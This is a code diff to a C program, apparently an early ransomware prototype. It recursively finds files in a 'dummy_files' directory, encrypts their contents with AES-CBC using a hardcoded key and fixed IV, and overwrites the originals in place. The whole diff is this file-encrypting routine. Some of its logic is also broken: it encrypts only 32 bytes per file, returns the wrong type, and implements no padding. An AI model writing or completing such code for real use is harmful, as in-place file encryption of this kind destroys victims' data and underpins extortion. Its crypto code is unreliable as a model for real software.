@@ -2,12 +2,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <dirent.h>
+#include <stdbool.h>
+
+#include "tiny-AES-c/aes.h"
 
 // d_type = 4 -> directory
+// d_type = 8 -> file
 #define E_FOLDER 4
 #define E_FILE 8
 const char *FILES_TO_ENCRYPT = "dummy_files";
-const char *ENCRYPTION_KEY = "NFTs_are_a_scam";
+const uint8_t ENCRYPTION_KEY[] = "NFTs_are_a_scam";
+const uint8_t IV[]  = "fffffffffffffff";  // initializer vector. Should be random.
 
 char **find_files(const char *dir_name)
 {
@@ -17,8 +22,7 @@ char **find_files(const char *dir_name)
     DIR *dir = opendir(dir_name);
 
     if (dir == NULL) {
-        printf("Dir = NULL");
-        // add return '\0'
+        return '\0';
     }
     
     struct dirent *entity;
@@ -57,94 +61,100 @@ char **find_files(const char *dir_name)
     return file_paths;
 }
 
-char *read_file(char *filename)
+long find_file_len(char *file_name)
 {
-    FILE *fptr;
-    char current_char;
-    int i = 0;
-    fptr = fopen(filename, "rb");
+    FILE *fileptr;
+    long filelen;
+    // open the file in binary mode
+    fileptr = fopen(file_name, "rb");
 
-    // find size of file in bytes
-    fseek(fptr, 0, SEEK_END);
-    long size = ftell(fptr);
-    fseek(fptr, 0, SEEK_SET);
-    //printf("%ld\n", size);
+    // redundant check is we know from find_files this file must exist
+    //if (fileptr == NULL) {
+    //    return -1;
+    //}
+    // Jump to the end of the file, get offset, then jump back
+    fseek(fileptr, 0, SEEK_END);
+    filelen = ftell(fileptr);
+    fclose(fileptr);
+    return filelen;
+}
 
-    // proceed with allocating memory and reading the file
-    char *data = malloc(size * sizeof(char));
+char *read_file(long filelen, char *file_name)
+{
+    FILE *fileptr;
+    char *buffer;
 
-    if (fptr == NULL) {
-        printf("Cannot open file\n");
-        exit(0);
-    }
-    current_char = fgetc(fptr);
-    while (current_char != EOF) {  // EOF -> end of file
-        data[i] = current_char;
-        i++;
-        //printf("%c", current_char);
-        current_char = fgetc(fptr);
-    }
-    fclose(fptr);
-    //printf("%s\n", data);
-    //printf("EOF\n");
-    return data;
+    // open the file in binary mode
+    fileptr = fopen(file_name, "rb");
+
+    // redundant check is we know from find_files this file must exist
+    //if (fileptr == NULL) {
+    //    return '\0';
+    //}
+
+    buffer = malloc(filelen);
+    fread(buffer, filelen, 1, fileptr); 
+    fclose(fileptr);
+    return buffer;
 }
 
 int main()
 {
+    // init AES
+    struct AES_ctx ctx;
+    AES_init_ctx_iv(&ctx, ENCRYPTION_KEY, IV);
+
     // array of strings contain relative path to the files to be encrypted
     char **files = find_files(FILES_TO_ENCRYPT);
+    char i = 1;
+    bool encrypt = true;
+
+    if (files == NULL) {
+        printf("No files to encrypt\n");
+        exit(1);
+    }
 
     while (*files) {
-            //printf("%s\n", *files);
-            char *data = read_file(*files);
+        long filelen = find_file_len(*files);
+        if (filelen == 0) {
+            printf("File '%s' is empty, skipping it\n", *files);
             files++;
-                
-            FILE *fp;
-            size_t count;
-            char written[255] = "";
-            strcat(written, *files);
-            strcat(written, "a");
-            printf("%s\n", written);
-            fp = fopen(written, "wb+");
-         
-            if(fp == NULL) {
-                printf("file couldn't be opened\n");
-                exit(1);
-            }
-         
-            count = fwrite(data,1,strlen(*files),fp);
-            printf("Bytes written : %ld\n", count);
-            free(data);
-         
-         
-            fclose(fp);
-     
-        //return 0;
-    }
-    free(files);
+            continue;
+        }
 
+        char *data = read_file(filelen, *files);
+                
+        //  write to file
+        FILE *fileptr;
+        // testing name for testing purposes
+        //char test_name[255] = {0};
+        //strcat(test_name, *files);
+        //strcat(test_name, ".changed");
+        //printf("%s\n", test_name);
+        fileptr = fopen(*files, "wb+");
+
+        if(fileptr == NULL) {
+            printf("file couldn't be opened\n");
+            exit(1);
+        }
+
+        if (encrypt)
+            AES_CBC_encrypt_buffer(&ctx, data, 32);
+        else
+            AES_CBC_decrypt_buffer(&ctx, data, 32);
+
+        size_t count = fwrite(data, 1, filelen, fileptr);
+        printf("Name: %s, File len: %ld, Bytes written : %ld\n", *files, filelen, count);
+
+        fclose(fileptr);
+        free(data);
+        i++;
+        files++;
+ 
+    }
 }
 
 
 // AES stuff
 // encrypt, pad
 // decrypt, unpad
-
-
-char *get_file_content()
-{
-}
-
-char *encrypt_file()
-{
-}
-
-char *decrypt_file()
-{
-}
-
-void write_to_file()
-{
-}
-
